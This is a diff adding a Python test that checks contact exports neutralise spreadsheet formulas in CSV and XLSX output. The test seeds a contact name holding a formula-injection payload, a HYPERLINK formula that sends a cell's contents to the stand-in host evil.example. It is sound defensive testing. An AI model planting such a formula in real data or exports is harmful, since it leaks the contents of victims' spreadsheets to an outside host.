@@ -86,3 +86,20 @@ async def test_exports_csv_and_xlsx(api: Api, seed: Seed) -> None:
     xlsx = await client.get("/v1/exports/products", params={"format": "xlsx"})
     sheet = load_workbook(io.BytesIO(xlsx.content)).active
     assert sheet is not None and sheet.cell(1, 1).value == "sku"
+
+
+async def test_exports_neutralise_formula_cells(api: Api, databases: Any, deps: Any, seed: Seed) -> None:
+    """M4: a buyer-chosen name that a spreadsheet would run as a formula is exported as plain text."""
+    client, auth = api
+    hostile = '=HYPERLINK("https://evil.example/?"&A2,"click")'
+    gw = CrmGatewayImpl(databases, deps)
+    deal_id = await gw.resolve_deal("whatsapp", new_phone(), None)
+    await gw.set_contact(deal_id, ContactPatch(name=hostile), AiRole.CONTACT_CAPTURE)
+    auth.as_(Role.MANAGER, MGR_ID)
+    csv = (await client.get("/v1/exports/contacts", params={"format": "csv"})).text
+    assert "'=HYPERLINK(" in csv and ',"=HYPERLINK(' not in csv and "\n=HYPERLINK(" not in csv
+    xlsx = await client.get("/v1/exports/contacts", params={"format": "xlsx"})
+    sheet = load_workbook(io.BytesIO(xlsx.content)).active
+    assert sheet is not None
+    cells = [c for row in sheet.iter_rows(min_row=2) for c in row if c.value == hostile]
+    assert cells and all(c.data_type == "s" for c in cells)  # a string, never a formula ("f")
